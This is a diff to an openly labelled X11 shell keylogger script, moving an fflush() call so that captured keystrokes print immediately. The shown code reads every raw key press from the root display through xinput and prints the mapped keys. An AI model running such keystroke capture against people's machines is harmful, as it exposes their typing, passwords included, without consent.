@@ -1,6 +1,6 @@
 #!/bin/sh
 
-# keylogger v1.1
+# keylogger v1.2
 # Bruno "GNUser" Dantas GPLv3
 
 main()
@@ -23,8 +23,7 @@ monitor_keyboard()
 {
 	LANG=C xinput --test-xi2 --root | awk '
 /RawKeyPress/ { relevant=1 }
-relevant==1 && /detail/ { print $2; relevant=0 }
-{ fflush() }
+relevant==1 && /detail/ { print $2; fflush(); relevant=0 }
 ' | while read keycode; do
 		key=$(eval echo \$map_$keycode)
 		printf "$key"
